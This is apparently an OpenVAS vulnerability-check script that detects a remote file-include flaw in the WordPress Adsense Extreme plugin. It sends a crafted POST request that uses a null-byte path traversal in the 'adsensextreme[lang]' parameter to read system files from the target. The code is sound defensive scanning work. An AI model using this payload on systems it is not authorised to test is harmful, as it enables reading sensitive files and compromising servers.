###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_49713.nasl 7015 2017-08-28 11:51:24Z teissa $
#
# WordPress Adsense Extreme Plugin 'adsensextreme[lang]' Parameter Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103264");
 script_version("$Revision: 7015 $");
 script_tag(name:"last_modification", value:"$Date: 2017-08-28 13:51:24 +0200 (Mon, 28 Aug 2017) $");
 script_tag(name:"creation_date", value:"2011-09-22 13:43:24 +0200 (Thu, 22 Sep 2011)");
 script_bugtraq_id(49713);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("WordPress Adsense Extreme Plugin 'adsensextreme[lang]' Parameter Remote File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49713");
 script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/adsense-extreme/");
 script_xref(name : "URL" , value : "http://wordpress.org/");

 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("wordpress/installed");
 script_tag(name : "solution" , value : "Updates are available. Please see the references for more details.");
 script_tag(name : "summary" , value : "The Adsense Extreme plug-in for WordPress is prone to a remote
 file-include vulnerability because it fails to sufficiently
 sanitize user-supplied input.");
 script_tag(name : "impact" , value : "Exploiting this issue could allow an attacker to compromise the
 application and the underlying system; other attacks are also
 possible.");
 script_tag(name : "affected" , value : "Adsense Extreme 1.0.3 is vulnerable; other versions may also be
 affected.");

 script_tag(name:"solution_type", value:"VendorFix");

 script_tag(name:"qod_type", value:"remote_app");

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
if(!port = get_app_port(cpe:CPE))exit(0);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  variables = string("adsensextreme[lang]=/",files[file],"%00");
  filename  = string(dir,"//wp-content/plugins/adsense-extreme/adsensextremeadminpage.php");
  host = get_host_name();
  refHost = host;
  if( port != 80 && port != 443 )
    host += ':' + port;

  req = string(
      "POST ", filename, " HTTP/1.1\r\n", 
      "Referer: ","http://", refHost, filename, "\r\n",
      "Host: ", host, "\r\n", 
      "Content-Type: application/x-www-form-urlencoded\r\n", 
      "Content-Length: ", strlen(variables), 
      "\r\n\r\n", 
      variables
  );

  result = http_send_recv(port:port, data:req, bodyonly:FALSE);

  if(egrep(pattern: file, string: result, icase: TRUE)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);